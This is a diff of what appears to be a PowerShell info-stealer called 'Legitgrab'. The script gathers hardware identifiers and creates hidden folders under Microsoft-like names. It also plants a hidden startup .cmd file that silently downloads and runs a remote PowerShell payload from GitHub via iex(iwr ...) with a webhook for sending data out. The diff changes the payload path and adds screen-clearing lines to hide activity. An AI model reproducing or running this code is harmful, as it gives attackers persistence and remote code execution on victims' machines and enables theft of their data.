@@ -12,7 +12,9 @@ $cpu = (Get-WmiObject Win32_Processor).Name
 $hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
 md C:\windows\temp\Win.microsoft.Security.temp
+cls
 attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
+cls
 #####################################################################
 
 
@@ -20,10 +22,10 @@ attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
 
 Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
 @echo off
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/g.ps1).content)
+powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/gr.ps1).content)
 "
 attrib +h "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd"
-
+cls
 #####################################################################
 
 #####################################################################
